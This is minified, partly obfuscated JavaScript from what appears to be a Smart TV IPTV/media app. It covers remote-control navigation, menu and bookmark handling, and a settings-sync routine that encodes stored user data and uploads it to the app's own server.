var np_timer,np_timer_start=0,chfon=0;function np_d(code){np_timer_start++;keyHandler({'keycode':code});var tm=500-np_timer_start*80;if(tm<50)tm=50;np_timer=setTimeout("np_d("+code+");",tm)}
function np_u(code){clearTimeout(np_timer)}
var insetActive=0;var lastInset=0;var insetSelect=0;var insetCount=0;var icodef="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAB9klEQVRIS7XUPUhVcRzGcd+7VxKVm5UVhW5BYINgEEpDbY7SptEggotbDg1NDQZCQjpFBDY4+EJGWE1aCAaBLqJS0CJEbiaCZXX7Pvfv0fPYcTs+8OHe3znc3zn/t1uUz+ePTeLFtCReTIsXR6ca53EJ51CFxFg/KzzFuIg+TGIRa/iEF+hGHSzWzwrPNbzHT3zBON5gBv1731+jCfuxflaE6I3V+Cv+YgefMY0W1KMCd7EJjaQRhVg/K0I0FbP4DjV8gFtoQAmidOIjfkHTdgrez4oQzbGmI3rTM0iKRncPmqYt3IH3syLsijF0oRXtUJNSxKN5fod1zOMbRpC1flaE7fYBV3AWGu4COlCOKPfxB/qRPn/jJWqtnxVhH2uBLqAZP6AbWtw2KFrwXmixdU/0XSPJWT8rwgGZw1XoQXpr/VCWEe1rTdMNDEAvoPtTqLF+VoSTN4oenMAjaMgyiDLEcxMb0P0hZKyfFSE6eW+hOVdz7XM1rkQ80fRsQ7vlNryfFSEa+is8gXaAHnAah6MFfo5dPMNJeD8rDqKtpoO0Cs1tUi5jCVpI7bJCrJ8VHh3pCejP6iGuQ6dUD3uMFTzFfmPF+lnxf3SkdfKGod2g06g/MDXXHBemIh7rZ8XRyaIWOdQgg8RYv3iRtsSLaUm8mI580T9yJyqr4N64nwAAAABJRU5ErkJggg==";var oldinset=null;var insetSets={};var lIIO1OV0II00QIQYpr=null,toploading=0,shn=0;function page_rs(t){if(t==null)t=$_("page_load");if(t.src.indexOf("stop")>0){IlO11lQ0().stop()}else if(t.src.indexOf("reload")>0){IlO11lQ0().reload()}}
function is_loadpage(m){if($_("page_load")==null)return;if(m!=null){if(m==-1){var p=Ill001()||gP();p.cancel();return is_loadpage(0)}
if(m){$_("page_load").src=_img('_ST_page_stop.png')}else{$_('page_load').src=_img('_ST_page_reload.png')}}else if($_("page_load")!=null)if($_("page_load").src.indexOf("stop")>0)return 1;else return 0}
function stopLoadPage(){IlO11lQ0().stopLoad()}
var sdbar=null,sdbarSel=0;function sidebar_play(){IlO11lQ0().navigate(sdbar[sdbarSel])}
function sidebar_show(n){if(n!=null)sdbarSel=n;IlO11lQ0().focused()}
function menu_play(){if(typeof gP().menu[menuSel]=="undefined")return;if(menuSubSel>=0)IlO11lQ0().navigate(gP().menusub[menuSubSel]);else if(gP().menu[menuSel].playlist_url=="submenu"){$_("menu"+menuSel+"sub").style.display="block";gP().menusub=gP().menu[menuSel].submenu;menuSubSel=-1}else IlO11lQ0().navigate(gP().menu[menuSel])}
function menu_hideSub(n){if(gP().menu.length<1)return;if(n==null){for(var i=0;i<gP().menu.length;i++)if($_("menu"+i+"sub")!=null)$_("menu"+i+"sub").style.display="none"}else if($_("menu"+n+"sub")!=null)$_("menu"+n+"sub").style.display="none";menuSubSel=-2}
function menu_sel(){try{if(gP()!=null){if(gP().menu.length<1||$_("menu0")==null)return
if(menuSubSel>-2){if(menuSubSel>gP().menusub.length-1){menuSubSel=-2;IlO11lQ0().focused(0);return}else{for(var i=0;i<gP().menusub.length;i++){if(i==menuSubSel&&getSelect()==-3){$_("menu"+menuSel+"sub"+i).style.border="2px solid red"}else{$_("menu"+menuSel+"sub"+i).style.border="2px solid transparent"}}}}
if(menuSel>gP().menu.length-1)menuSel=0;else if(menuSel<0)menuSel=gP().menu.length-1;for(var i=0;i<gP().menu.length;i++){if(i==menuSel&&getSelect()==-3&&menuSubSel<0){$_("menu"+i).style.border="2px solid red"}else{$_("menu"+i).style.border="2px solid transparent"}}}}catch(e){}}
function sidebar_sel(){if(maJor.params.get("sidebar")!="1")return
if(sdbarSel>sdbar.length-1)sdbarSel=0;else if(sdbarSel<0)sdbarSel=sdbar.length-1;for(var i=0;i<sdbar.length;i++){if($_("sdbar"+i)!=null){if(i==sdbarSel&&getSelect()==-2)$_("sdbar"+i).style.border="2px solid rgb(85, 144, 231)";else $_("sdbar"+i).style.border="2px solid transparent"}}}
var hideRight=!1;var lastResel="";function reselAll(n){if(n!=null)setSelect(n);var hsh=getSelect()+" "+menuSel+" "+menuSubSel+" "+sdbarSel;if(lastResel!=hsh){oInset.listInset();menu_sel();sidebar_sel();oInset.omniSel()}
lastResel=hsh}
function osetPos(x,y){if(lastsel==-4&&select!=-4)reselAll();if(x==0){margin=0;if(y==-1){if(getSelect()==-4)setSelect(-1);else if(getSelect()==-3){if(menuSubSel<0){if(maJor.params.get("sidebar")=="1")setSelect(-2);else setSelect(-4)}else{return menu_sel(--menuSubSel)}}else if(getSelect()==-2)setSelect(-4);else{var row=-1;if(getSelect()>=0){if(gP()==null){row=0}else if(typeof gP().sPos[getSelect()]=="undefined")row=0;else row=gP().sPos[getSelect()][1];if(row==0){if(gP()!=null&&gP().menu.length)setSelect(-3);else if(maJor.params.get("sidebar")=="1")setSelect(-2);else setSelect(-4)}}
if(gP()!=null&&row!=0)IlO11lQ0().posStart(0,-1)}}
if(y==1){if(getSelect()==-1)setSelect(-4);else if(getSelect()==-4){if(maJor.params.get("sidebar")=="1")setSelect(-2);else if(typeof gP()=="undefined")setSelect(-1);else if(gP().menu.length)setSelect(-3);else IlO11lQ0().focused(0)}else if(getSelect()==-3){if(menuSubSel==-2)IlO11lQ0().focused(0);else{return menu_sel(++menuSubSel)}}else if(getSelect()==-2&&gP().menu.length)setSelect(-3);else if(getSelect()==-2)IlO11lQ0().focused(0);else{IlO11lQ0().posStart(0,1)}}
linkOver()}
if(y==0){if(x==1){if(getSelect()==-4){return oInset.omniSel("+")}else if(getSelect()==-3){menu_hideSub();return menu_sel(++menuSel)}else if(getSelect()==-2)return sidebar_show(++sdbarSel);else if(getSelect()==-1){oInset.listInset(++insetSelect);IlO11lQ0().hint();return}
if(gP("lII1I1PVBuI1lIlYpr").indexOf("tosettings")==0||gP("lII1I1PVBuI1lIlYpr")=="cmdSetSearch"||gP("lII1I1PVBuI1lIlYpr")=="cmdSetStart"){kjtYpr.lO0lI1IIIumMEF0I1IIYpr(curCh()["playlist_url"],key)}else{IlO11lQ0().posStart(1,0)}}
if(x==-1){if(getSelect()==-4){return oInset.omniSel("-")}else if(getSelect()==-3){menu_hideSub();return menu_sel(--menuSel)}else if(getSelect()==-2)return sidebar_show(--sdbarSel);else if(getSelect()==-1){oInset.listInset(--insetSelect);IlO11lQ0().hint();return}
IlO11lQ0().posStart(-1,0)}}
if(gP()==null)reselAll()}
function _img(s){if(typeof s=="undefined")s="_ST_1px.png";else if(s.match(/^.{0,3}(none|hidden|undefined)/))s="_ST_1px.png";s=s.replace("_ST_","https://raw.githubusercontent.com/komivp/appinfodl/main/static/");if(s.indexOf("ndate")>0){var mtc=s.match(/ndate(.*?)_/);if(mtc!=null)n=mtc[1];else n=999999}else n=180929;if(version_local_files>=n&&!s.match(/visual(2|3).gif$/)&&(!s.match(/fon..?\.jpg$/)||s.indexOf("fon20.jpg")>0)){s=s.replace("https://raw.githubusercontent.com/komivp/appinfodl/main/static/","static/")}
return s}
var rates={};var lastsel=0,hmenu="",cVc=0;var adop="",ncc=0,sPos={},sPosX=0,sPosY=0;function t_s(t,index){if(index!=null&&getSelect()!=index)IlO11lQ0().focused(index,t);kjtYpr.long_t=1;kjtYpr.t_timer=setTimeout('kjtYpr.long_t=0;kjtYpr.llI0IOruD0IOI1IYpr();',1200)}
function t_e(){if(kjtYpr.long_t){kjtYpr.long_t=0;clearTimeout(kjtYpr.t_timer)}}
function p_d(t,index){if(index!=null&&getSelect()!=index)IlO11lQ0().focused(index,t);kjtYpr.long_left=!1;kjtYpr.long_timer=setTimeout('kjtYpr.long_left=true;kjtYpr.llI0IOruD0IOI1IYpr();',700)}
function p_u(){clearTimeout(kjtYpr.long_timer)}
function p_c(ind){if(handler=="context")return;if(!kjtYpr.long_left)IlO11lQ0().play(ind);kjtYpr.long_left=!1}
function lOI1I1i01O10lYpr(){return}
function set_times(mode){if(l0O0l0111mJXG1OII1OYpr()||!vPlayer.ftimes||!gP())return;for(var i=0;i<gP("channels").length;i++){if(gV(gP("channels")[i],"stream_url")){if($_("titleid"+i)){if(vPlayer.ftimes[getIdent(i)])$_("titleid"+i).style.textDecoration="line-through";else if(mode)$_("titleid"+i).style.textDecoration=""}
if(allTimes[getIdent(i)]&&$_("numch"+i)){if(allTimes[getIdent(i)].d!=kjtYpr.hardware+" ("+maJor.getId()+")"){$_("numch"+i).style.textDecoration="underline"}else $_("numch"+i).style.textDecoration=""}}}}
var stopAnim=!1,elAnim=null;function animateTitle(scrollingWidth){var id=$_('titleid'+getSelect());if(!stopAnim&&id!=null){elAnim=$(id);elAnim.animate({left:"-=30"},{duration:800,easing:'linear',complete:function(){if(elAnim.css("left").split("px")[0]<-1*scrollingWidth){elAnim.css("left",0);setTimeout(function(){if(!stopAnim)animateTitle(scrollingWidth)},1000)}else if(!stopAnim)animateTitle(scrollingWidth)}})}}
function stopRoll(){if(elAnim!=null){stopAnim=1;elAnim.stop(!0,!0).css("left","0");elAnim=null}}
var rollTimer;function rollTitle(w){clearTimeout(rollTimer);rollTimer=setTimeout(function(){var id=$_('titleid'+getSelect());if(id!=null){stopRoll();var scrollingWidth=$($_('titleid'+getSelect())).width()-$($_('title'+getSelect())).width();if(w==null&&$(id).css("position")=="relative"&&scrollingWidth>0){stopAnim=!1;animateTitle(scrollingWidth+15)}}},1000)};function addHandler(object,event,handler,useCapture){if(object.addEventListener){object.addEventListener(event,handler,useCapture?useCapture:!1)}else if(object.attachEvent){object.attachEvent('on'+event,handler)}else{}}
var lastScroll=0,progScroll=0,tmpsel=0;function scrollSite(){t_e();var curPage=gP();buff.cleartop();if(!progScroll)gP().renderChannels(null,"focused");else{}
progScroll=0}
var stpeI,mcanc=10,CAS=[];function linkOver(s,el,cb){if(handler=='context'||handler=='vk'||handler=='move'||handler=='confirm'||handler=='group')return;IlO11lQ0().focused(s,el)}
var lapsetimer,timerScroll;var chOrig,chLast=0,modeGroup=!1;RegExp.escape=function(text){return text.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")};var subMenu=[],subl0I10IWOIOOO1IYpr,submenuParent,submenuSelIcon={},selfbookm=!1;function closeSubMenu(){if($_("submenu")!=null)$("#submenu").remove();subMenu=[]}
function showSubMenu(m,sub){if($_("submenu")!=null)$("#submenu").remove();selfbookm=!1;$_("MenuCh").style.display="block";$_("llO0I111lvwajllII11Ypr"+l0I10IWOIOOO1IYpr).style.backgroundColor=maJor.rgba("rgb(70, 77, 90)");handler="context";var mR=$_("MenuCh").offsetLeft+$_("MenuCh").offsetWidth;var div=document.createElement('div');div.id="submenu";div.style.color="#EEEEEE";div.style.overflow="visible";div.style.textAlign="left";div.style.width="auto";div.style.maxWidth="390px";div.style.border="1px solid gray";div.style.fontSize="23px";div.style.backgroundColor="#323c42";subl0I10IWOIOOO1IYpr=0;submenuParent=l0I10IWOIOOO1IYpr;div.style.position="absolute";var curPage=IlO11lQ0();subMenu=[];if(sub!=null)subMenu=sub;else if(m!=null){if(m=="cmdSorting"){var logo="<img src='"+_img("_ST_ok.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> ";subMenu.push({"title":"_FPTop_ (+1)","cmd":"cmdSetSorting","opt":"1"});subMenu.push({"title":"_FPpoumolch_ (0)","cmd":"cmdSetSorting","opt":"0"});subMenu.push({"title":"_FPBottom_ (-1)","cmd":"cmdSetSorting","opt":"-1"})}else if(m=="cmdAudio"){if(vPlayer.audio.vk_repeat)var logo="<img src='"+_img("_ST_ok.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> Повтор";else logo="Повтор";subMenu.push({"title":logo,"cmd":"cmdAudioRepeat"});subMenu.push({"title":"Перемешать","cmd":"cmdAudioShuffle"});subMenu.push({"title":"Визуализация 1 ","cmd":"cmdAudioV","opt":"3"})}else if(m=="Bookmarks"||m=="cmdMoveBookmarks"){if(m=="Bookmarks"){var s1="_FPDobavitV_";var s2=""}else{s1="_FPPeremV_";s2="cmdMove"}
if(gP().is_iptv>2&&getSelect()>=0&&curCh("stream_url")&&!curCh("parser")){logo="<img src='"+_img("_ST_1px.png")+"' id='selfbookmarkimg' width=21 height=16 /> ";subMenu.push({"title":logo+"Самообновляемая закладка","cmd":"selfbookmark"})}
if(maJor.read("zakladki.xml"))subMenu.push({"title":s1+" _FPzakladki_ / _FPRaznoe_","cmd":s2,"opt":"zakladki.xml"});if(maJor.read("zakladkiSerials.xml"))subMenu.push({"title":s1+" _FPzakladki_ / _FPSeriali_","cmd":s2,"opt":"zakladkiSerials.xml"});if(maJor.read("zakladkiFilms.xml"))subMenu.push({"title":s1+" _FPzakladki_ / _FPFilmi_","cmd":s2,"opt":"zakladkiFilms.xml"});if(maJor.read("zakladkiIPTV.xml"))subMenu.push({"title":s1+" _FPzakladki_ / IPTV","cmd":s2,"opt":"zakladkiIPTV.xml"});var dopch=l0OIIlIIlONuu1111Ypr(maJor.read("bookmarks"))||[];for(var i=0;i<dopch.length;i++){if(dopch[i].logo_30x30)var logo="<img src='"+_img(dopch[i].logo_30x30)+"' width=21 height=16 /> "+s1+" "+dopch[i].title;else logo=s1+" "+dopch[i].title;if(dopch[i].playlist_url!="bookmarks/toolbar")
subMenu.push({"title":logo,"cmd":s2,"opt":dopch[i].playlist_url})}
logo="<img src='"+_img("_ST_plus.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" Новую папку";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addnew"});subMenu.push({"title":s1+" _FPBookmark toolbar_","cmd":s2,"opt":"bookmarks/toolbar"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_ 2";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext2"});logo="<img src='"+_img("_ST_b_c.png")+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+s1+" _FPVneshnie_ _FPzakladki_ 3";subMenu.push({"title":logo,"cmd":s2,"opt":"bookmarks/addext3"})}}else{subMenu.push({"title":"_FPRename_","cmd":"cmdRename"});if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")!=0&&gP("lII1I1PVBuI1lIlYpr").indexOf("zakladki")!=0){subMenu.push({"title":"_FPChangeURLicon_","cmd":"cmdUrlIcon"});subMenu.push({"title":"_FPSelectIcon_","cmd":"cmdSelIcon"});subMenu.push({"title":"_FPEdit URL_","cmd":"cmdEditUrl"})}}
if(getSelect()>=0)if(curPage.curCh("playlist_url").indexOf("bookmarks/")==0)subMenu.push({"title":"_FPDelete_","cmd":function(){var x=0,d=0;markedObj.entries(function(ch,n){d++;x+=parseInt(xhr_bookmark(ch.playlist_url,"count"))});confirmed.create("_FPAre you sure_?<br>("+d+" папок, "+x+" закладок)").fun0=function(){var g=getSelect();markedObj.entries(function(ch,n){g--;setSelect(-1);xhr_bookmark(ch.playlist_url,"alldel")});if(g<0)g=0;setSelect(s);IlO11lQ0().reload()};markedObj.cancel()}});var html="";for(var i=0;i<subMenu.length;i++){if(gV(subMenu[i].icon)!="")subMenu[i].title="<img src='"+_img(subMenu[i].icon)+"' width="+css_w(21)+" height="+css_wh(16)+" /> "+subMenu[i].title;if(subMenu[i].title.indexOf("img src")==-1)subMenu[i].title="<span style='padding-left:"+css_w(28)+"px;height:"+css_wh(25)+"px;padding-top:2px;'></span>"+subMenu[i].title;html+="<div"+llOlI0OfCMO0l0I0Ypr(1,[" onmousemove=\"subl0I10IWOIOOO1IYpr="+i+";kjtYpr.llI0IOruD0IOI1IYprPos(subl0I10IWOIOOO1IYpr,true);\" onclick=\"subl0I10IWOIOOO1IYpr="+i+";subMenuEnter();\"",""])+" id='subllO0I111lvwajllII11Ypr"+i+"' class='menuchannel' style='width:auto;height:"+css_wh(25)+"px;overflow:hidden;'>"+subMenu[i].title+"</div>"}
div.innerHTML=maJor.fp(html);div.style.top=($_("llO0I111lvwajllII11Ypr"+l0I10IWOIOOO1IYpr).offsetTop+$_("MenuCh").offsetTop)+"px";$_("main").appendChild(div);if($("#site").width()-mR<370)$_("submenu").style.left=($_("MenuCh").offsetLeft-$("#submenu").width()-1)+"px";else $_("submenu").style.left=(mR+1)+"px";kjtYpr.llI0IOruD0IOI1IYprPos(subl0I10IWOIOOO1IYpr,!0)}
function subMenuEnter(){if(subMenu.length>0){if(typeof subMenu[subl0I10IWOIOOO1IYpr].cmd=="function"){kjtYpr.llI0IOruD0IOI1IYprPlay(subMenu[subl0I10IWOIOOO1IYpr].cmd,subMenu[subl0I10IWOIOOO1IYpr].args)}else if(subMenu[subl0I10IWOIOOO1IYpr].cmd=="cmdSetSorting"||subMenu[subl0I10IWOIOOO1IYpr].cmd==""||subMenu[subl0I10IWOIOOO1IYpr].cmd=="cmdAudioV"||subMenu[subl0I10IWOIOOO1IYpr].cmd=="cmdMove"){Menu[l0I10IWOIOOO1IYpr][3]=subMenu[subl0I10IWOIOOO1IYpr].opt;kjtYpr.llI0IOruD0IOI1IYprPlay(subMenu[subl0I10IWOIOOO1IYpr].cmd)}else kjtYpr.llI0IOruD0IOI1IYprPlay(subMenu[subl0I10IWOIOOO1IYpr].cmd)}else{kjtYpr.llI0IOruD0IOI1IYprPlay(Menu[l0I10IWOIOOO1IYpr][2],Menu[l0I10IWOIOOO1IYpr][3])}}
var mB64={b64_table:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-/=",keyCharAt:function(key,i){if(key.length)return key.charCodeAt(Math.floor(i%key.length));else return 0},ToNum:function(a){var c=this;var n=0,b=64;var mas=c.b64_table.slice(0,b);a=String(a);for(var i=0;i<a.length;i++){n=n+(mas.indexOf(a.substr(a.length-i-1,1))*Math.pow(b,i))}
return n},ToStr:function(a){var c=this;var s="",cc=64;var mas=c.b64_table.slice(0,cc);while(a>0){s=String(s)+mas[a%cc];a=Math.floor(a/cc)}
return s.split("").reverse().join("")},encrypt:function(text){var c=this;try{var key=gV(gnxu.split("|")[0].split("="),1);text=_.map(text,function(co,i){var h1=co.charCodeAt(0)^c.keyCharAt(key,i);if(h1<64*64){var n1=Math.floor(h1/64);var n2=h1%64;var enc=c.b64_table.charAt(n1)+c.b64_table.charAt(n2)}else{enc="="+c.ToStr(h1)+"="}
return enc});text=text.join("");return text}catch(e){kjtYpr.popUp("Error join DATA! "+e.message,2000);return text}},decrypt:function(text,key){var c=this;if(key==null)key=gV(gnxu.split("|")[0].split("="),1);var i=0,res="",num=0;while(i<text.length){var h1=text.charAt(i++);var h2=text.charAt(i++);var e="";if(h1=="="){e+=h2;while(i<text.length&&text.charAt(++i)!="="){e+=text.charAt(i)}
i++}else e=h1+h2;e=c.ToNum(e);var code=c.keyCharAt(key,num)^e;res+=String.fromCharCode(code);num++}
return res}}
function testenc(){var k=allfs,g="";for(var i in k){var s=maJor.read(k[i]);for(var j=0;j<10;j++)g+=s+"[-..-]"}
var runtime=Date.now();for(var j=0;j<3;j++){var s=mB64.encrypt(g)}
runtime=Date.now()-runtime}
function autoexport(m){if(gV(m)=="user")var wuser=1;else wuser=0;if(wuser&&user==null)return;var xhr=uHelper.create("directnoheader");xhr.parse=function(s){if(wuser){statusbar("sync user data ok");var data=l0OIIlIIlONuu1111Ypr(gV(s));if(data!=null)allTimes=l0OIIlIIlONuu1111Ypr(data.times)}else if(s.indexOf(".frk")>0){statusbar("sync settings data ok");maJor.wchanged=0;statusbar("off");if(m=="timer")return;else if(m=="store"){if(maJor.platform()=="tizen")document.location="http://smart.obovse.ru/?do=forktizen";else document.location="http://smart.obovse.ru/?do=fork"}else setTimeout("closeapp();",1000)}else{kjtYpr.inf("Ошибка сохранения данных на сервере! "+s,2500)}}
if(maJor.wchanged){var g="";if(wuser){var k=["glstart","bookmarks","history","zakladki.xml","zakladkiFilms.xml","zakladkiIPTV.xml","zakladkiSerials.xml","storage","times","settings","","","",""];for(var i=0;i<oInset.tabs.length;i++)k.push("url"+i);}else k=allfs;for(var i in k){var s=maJor.read(k[i]);g+=s+"[-..-]"}
xhr.getI("http://cloudflare.appfxml.com/browseraccount/?do=fexport&rev=4&"+(wuser?"v=user":"mode=auto")+"#POSTs="+mB64.encrypt(g))}else xhr.parse("ok.frk")}
var wlistRewrite=!1;var allfs=["glsearch","glstart","history","settings","epg_set","url0","url1","url2","url3","url4","url5","url6","url7","urlInset","searches","enteres","zakladki.xml","zakladkiSerials.xml","zakladkiFilms.xml","zakladkiIPTV.xml","times","vk_audio_pl","vk_audio_sel","vk_pl_url","bookmarks","lic","mlang","ordered","xr","url8","url9","storage","lastdata","datas","mf","url10","url11"];kjtYpr.llI0IOruD0IOI1IYprPlay=function(cmd,opt){if(cmd=="selfbookmark"){if($_("selfbookmarkimg").src==_img("_ST_select_all.png")){selfbookm=!1;$_("selfbookmarkimg").src=""+_img("_ST_1px.png")+""}else{selfbookm=!0;$_("selfbookmarkimg").src=_img("_ST_select_all.png");kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> Может значительно увеличиться время запуска закладки! Адрес закладки будет всегда самообновляться с этого плейлиста! ",3500)}
return}
if($_("vk").style.display!="none"){$_("vk").style.display="none";kjtYpr.inputId="";$_("main").style.display="block";handler="menu"}
closeSubMenu();$_("MenuCh").style.display="none";if(typeof cmd=="function"){if(!cmd(opt)){$_("MenuCh","");handler="menu";IlO11lQ0().focused()}
return}
var curPage=gP();var ch=curCh();wlistRewrite=!1;switch(cmd){case "cmdGoURL":handler="menu";IlO11lQ0().navigate(Menu[l0I10IWOIOOO1IYpr][3]);break;case "cmdMail":handler="menu";setSelect(0);olI11lQ1OhFv1II1Ypr("cmdmail");break;case "cmdMenuSettings":kjtYpr.llI0IOruD0IOI1IYpr('topmenu');break;case "cmdOpenStart":handler="menu";setSelect(0);gotoStart();break;case "cmdRewrite":wlistRewrite=!0;kjtYpr.l11II0OI1JuTullll0Ypr();break;case "cmdOpenInsetClose":insetCount++;insetSelect=insetCount-1;oInset.tabs[insetSelect]=oldinset;oInset.playInset();handler="menu";break;case "cmdSetIcon":if(Menu[l0I10IWOIOOO1IYpr][3]!="cancel"){if(submenuSelIcon.playlist_url.indexOf("bookmarks/")==0&&!selIconstart){xhr_bookmark(submenuSelIcon.playlist_url,cmd,Menu[l0I10IWOIOOO1IYpr][3])}else{var t=getVars("start");t.fav[submenuSelIcon.id].logo_30x30=Menu[l0I10IWOIOOO1IYpr][3];setVars("start",t);$_("vk").style.display="none";kjtYpr.inputId="";handler="menu";if(l0O0l0111mJXG1OII1OYpr())page_rs({"src":"_reload"})}}
submenuSelIcon={};handler="menu";break;case "cmdSelIcon":if(l0O0l0111mJXG1OII1OYpr())selIconstart=!0;else selIconstart=!1;submenuSelIcon=ch;submenuSelIcon.selicon=!0;handler="menu";subMenu=[];break;case "cmdUrlIcon":VK.open({title:"_FPEnterURLicon_",value:curCh("logo_30x30"),oncomplete:function(c){if(l0O0l0111mJXG1OII1OYpr()){var t=getVars("start");t.fav[c.pq.el.id].logo_30x30=c.str;setVars("start",t);c.close();IlO11lQ0().reload()}else if(c.pq.el.playlist_url.indexOf("bookmarks/")==0){xhr_bookmark(c.pq.el.playlist_url,cmd,c.str)}
return 1}});break;case "cmdEditUrl":VK.open({title:"_FPEnter URL_",value:(curCh("playlist_url")||curCh("stream_url")),oncomplete:function(c){if(l0O0l0111mJXG1OII1OYpr()){var t=getVars("start");var el=t.fav[c.pq.el.id];if(el.stream_url)el.stream_url=c.str;else el.playlist_url=c.str;setVars("start",t);c.close();IlO11lQ0().reload()}else return 1}});break;case "cmdRename":if(l0O0l0111mJXG1OII1OYpr())selIconstart=!0;else selIconstart=!1;VK.open({title:"_FPEnterTitle_",value:curCh("title").replace(/<.*?>/g,""),oncomplete:function(c){if(c.str=='')return;if(l0O0l0111mJXG1OII1OYpr()){var t=getVars("start");t.fav[c.pq.el.id].title=c.str;setVars("start",t)}else if(gV(c.pq.el,"playlist_url").indexOf("bookmarks/")==0){xhr_bookmark(c.pq.el.playlist_url,cmd,c.str)}else if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lII1I1PVBuI1lIlYpr"),"bookmarkRename",c.str)}else if(gP("lII1I1PVBuI1lIlYpr").indexOf("zakladki")==0){var data=l0OIIlIIlONuu1111Ypr(maJor.read(gP("lII1I1PVBuI1lIlYpr")));if(data==null){data={};data["cha"+"nnels"]=[]}else data["cha"+"nnels"][c.select].title=c.str;maJor.write(gP("lII1I1PVBuI1lIlYpr"),ll1lI1lI0sl0OlIYpr(data))}
c.close();IlO11lQ0().reload();return 1}});break;case "cmdAudioV":vPlayer.audio.visual(Menu[l0I10IWOIOOO1IYpr][3]);handler="menu";break;case "cmdAudioRepeat":vPlayer.audio.repeat(1);handler="menu";break;case "cmdAudioShuffle":vPlayer.audio.shuffle();handler="menu";break;case "cmdAudio":handler="menu";showSubMenu("cmdAudio");break;case "cmdEdit":if(l0O0l0111mJXG1OII1OYpr()&&ch.jtvname=="-1"){}
handler="menu";showSubMenu();break;case "Bookmarks":handler="menu";showSubMenu("Bookmarks");break;case "cmdSorting":handler="menu";showSubMenu("cmdSorting");break;case "cmdMoveBookmarks":handler="menu";showSubMenu(cmd);break;case "cmdRemoteUpdate":handler="menu";maJor.Remote.init();break;case "cmdTranslate":handler="menu";maJor.params.get("lang");var k=insetIn(-1,"get","title")+"[-|-]";for(var i=0;i<curPage.channels.length;i++){k+=curPage.channels[i].title+"[-|-]";k+=curPage.channels[i].description+"[-|-]"}
statusbar("translate page to "+maJor.params.get("lang")+"      ","translate");lI0O1IIlOVhl10II1lYprPost("http://"+lOIOOIIIOp0uOlOOI0Ypr+"/smarttv/api.php?do=translatepage&format=html&lang="+maJor.params.get("lang"),"k="+encodeURIComponent(k),"translatepage");break;case "cmdInsetBlock":IlO11lQ0().put("b",!IlO11lQ0().get("b"));handler="menu";break;case "cmdInsetStart":if(insetIn(-1,"get","a")==""){for(var i=0;i<insetCount;i++){if(insetIn(-1,"get","a",null,i)=="1")insetIn(-1,"put","a","",i)}
insetIn(-1,"put","a","1");insetIn(-1,"put","b","1");if(!maJor.params.get('recovery')){kjtYpr.popUp("_FPUdalenaGrupa_: _FPStartovoeMenu_");maJor.params.set('recovery',1)}}else insetIn(-1,"put","a","");handler="menu";break;case "cmdCancel":handler="menu";break;case "cmdReset":olI11lQ1OhFv1II1Ypr("cmdreset");break;case "cmdGroup":handler="menu";OpenUrl({"title":"_FPCategorys_","playlist_url":gP("lII1I1PVBuI1lIlYpr").split("#CAT=")[0]+"#CAT=LISTCATS"});break;case "cmdSetSorting":if(maJor.params.get('sortiptv')!=3){confirmed.create("_FPSortirovka_ IPTV: "+shint(10+parseInt(maJor.params.get('sortiptv')))+"<br>_FPEnabling can slow opening iptv lists_","Enabled?");confirmed.fun0=function(){maJor.params.set('sortiptv',3)};return}
var s=maJor.read("ordered");if(s=="")ordered={};else ordered=l0OIIlIIlONuu1111Ypr(s);if(ordered==null)ordered={};var nm=ord_id();if(typeof ch.origsel!=undefined&&ch.origsel!=undefined)origsel=ch.origsel;else origsel=getSelect();if(typeof ordered[nm]=="undefined")ordered[nm]={};if(typeof ordered[nm][origsel]=="undefined")ordered[nm][origsel]=0;opt=parseInt(Menu[l0I10IWOIOOO1IYpr][3]);if(opt==0)ordered[nm][origsel]=0;else ordered[nm][origsel]+=opt;if(ordered[nm][origsel]==0)delete ordered[nm][origsel];maJor.write("ordered",ll1lI1lI0sl0OlIYpr(ordered));handler="menu";gP().channels=reordered(l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(gP().ordchannels)));old_s=getSelect();gP().renderChannels(old_s,"update");break;case "cmdGlUp":kjtYpr.lO0lI1IIIumMEF0I1IIYpr(ch.playlist_url,VK_UP);break;case "cmdGlDown":kjtYpr.lO0lI1IIIumMEF0I1IIYpr(ch.playlist_url,VK_DOWN);break;case "cmdGlDel":kjtYpr.lO0lI1IIIumMEF0I1IIYpr(ch.playlist_url,VK_GREEN);break;case "cmdGlDef":maJor.write("glsearch","");kjtYpr.inf("Set default OK",1200);readGl();IlO11lQ0().reload();handler="menu";break;case "cmdStartDef":maJor.write("glstart","");kjtYpr.inf("_FPSetDefaultStartMenu_ OK",1200);IlO11lQ0().reload();handler="menu";break;case "cmdToStart":function caddtostart(m){var ch=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(m));if((gV(ch,"playlist_url").indexOf("no_save")>0||gV(ch,"stream_url").indexOf("no_save")>0)&&gP("lII1I1PVBuI1lIlYpr").indexOf("http")==0){kjtYpr.inf("_FPCopied denied by author playlist_! "+ch.title,2500);handler="menu"}else{var obj=cleanCh(ch);var t=getVars("start");t.fav.push(obj)
setVars("start",t);kjtYpr.inf("_FPDobavlenoV_ _FPStartovoeMenu_ "+obj.title,1200)}}
